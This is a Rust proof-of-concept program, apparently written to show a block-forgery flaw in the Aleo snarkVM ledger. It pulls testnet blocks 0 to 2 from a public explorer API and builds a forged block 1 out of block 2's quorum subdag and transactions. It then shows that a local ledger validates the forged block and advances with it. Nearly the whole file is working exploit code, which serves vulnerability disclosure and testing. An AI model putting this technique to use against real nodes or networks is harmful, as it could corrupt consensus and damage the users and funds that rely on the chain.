mod client;

use std::fmt::Debug;
use snarkvm::ledger::Ledger;
use snarkvm::prelude::{Block, Network};
use aleo_std::StorageMode;
use indexmap::IndexMap;
use rand::thread_rng;
use snarkvm::ledger::authority::Authority;
use snarkvm::ledger::narwhal::{Transmission, TransmissionID};
use snarkvm::ledger::store::helpers::memory::ConsensusMemory;
use crate::client::AleoRpcClient;
use snarkvm::prelude::TestnetV0;

#[tokio::main]
async fn main() {
    let client = AleoRpcClient::new("https://api.explorer.aleo.org/v1/testnet");

    let genesis = client.get_block(0).await.unwrap();

    let ledger = Ledger::<TestnetV0, ConsensusMemory<TestnetV0>>::load(genesis, StorageMode::Development(5)).unwrap();

    let block_1 = client.get_block(1).await.unwrap();

    ledger.check_next_block(&block_1, &mut rand::thread_rng()).unwrap();


    let block_2 = client.get_block(2).await.unwrap();

    // ******We forged a block_1 from block_2's subdag ****
    let block_1_forged_from_block_2 = forge_next_block(&ledger, &block_1, &block_2);

    // We are at block 0, but the forged block_2 pass the validation check
    ledger.check_next_block(&block_1_forged_from_block_2, &mut rand::thread_rng()).unwrap();
    println!("WARNING: Check forged block valid");

    ledger.advance_to_next_block(&block_1_forged_from_block_2).unwrap();
    println!("WARNING: Advance successfully with a forged block!!!!");

}


async fn get_current_genesis(client: &AleoRpcClient) -> Block<TestnetV0> {
    client.get_block(0).await.unwrap()
}


fn forge_next_block(ledger: &Ledger<TestnetV0, ConsensusMemory<TestnetV0>>, block_n: &Block<TestnetV0>, block_n1: &Block<TestnetV0>) -> Block<TestnetV0> {
    // ledger.prepare_advance_to_next_quorum_block();
    let authority = block_n1.authority();

    if let Authority::Quorum(subdag) = authority {
        let transmissions = block_to_transmissions(block_n1);
        let forged_block_n1 = ledger.prepare_advance_to_next_quorum_block(subdag.clone(), transmissions, &mut thread_rng()).unwrap();
        return forged_block_n1
    } else {
        unreachable!("")
    }
}

fn block_to_transmissions(block: &Block<TestnetV0>) -> IndexMap<TransmissionID<TestnetV0>, Transmission<TestnetV0>> {
    let mut result = IndexMap::new();
    for tx in block.transactions().iter() {
        result.insert(TransmissionID::from(tx.id()), tx.transaction().clone().into());
    }

    if let Some(coinbase_solution) = block.solutions().as_ref() {
        for solution in coinbase_solution.iter() {
            result.insert(TransmissionID::from(solution.id()), solution.clone().into());
        }
    }

    // Aborted solutions and Aborted transactions are not included
    result
}


